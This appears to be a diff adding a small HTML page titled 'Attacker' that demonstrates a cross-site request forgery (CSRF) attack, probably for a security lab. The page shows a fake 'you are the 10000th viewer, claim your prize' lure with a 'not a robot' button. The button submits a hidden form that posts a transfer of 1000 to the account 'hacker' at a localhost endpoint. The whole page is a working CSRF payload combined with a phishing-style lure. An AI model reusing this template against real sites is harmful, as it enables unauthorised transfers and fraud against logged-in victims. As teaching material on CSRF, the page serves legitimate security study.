@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!--Bootstrap CSS-->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css"
+          integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
+    <title>Attacker</title>
+</head>
+<body>
+<div class="container">
+    <img src="https://vignette.wikia.nocookie.net/boombeach/images/3/3b/Congratulation.gif/revision/latest?cb=20150501215824">
+    <div class="alert alert-danger" role="alert">
+        <h1 class="display-4">Congratulations!</h1>
+        <p class="lead">You are the 10000th viewer of this web site. We are happy to say that you have received a prize. We need to make sure you are not a robot. You can confirm this by clicking the button below.</p>
+        <hr>
+        <p class="mb-0">Click this button to ensure that you are not a robot and claim prize.</p>
+        <form id="my_data_form" method="post" action="http://localhost:8080/mydata">
+                <input type="hidden" name="receiver_account_number" class="form-control" id="receiver_account_number" value="hacker">
+                <input type="hidden" name="value" class="form-control" id="value" value="1000">
+            <button type="submit" class="btn btn-success btn-lg">Claim Gift!!</button>
+        </form>
+    </div>
+</div>
+</body>
+</html>
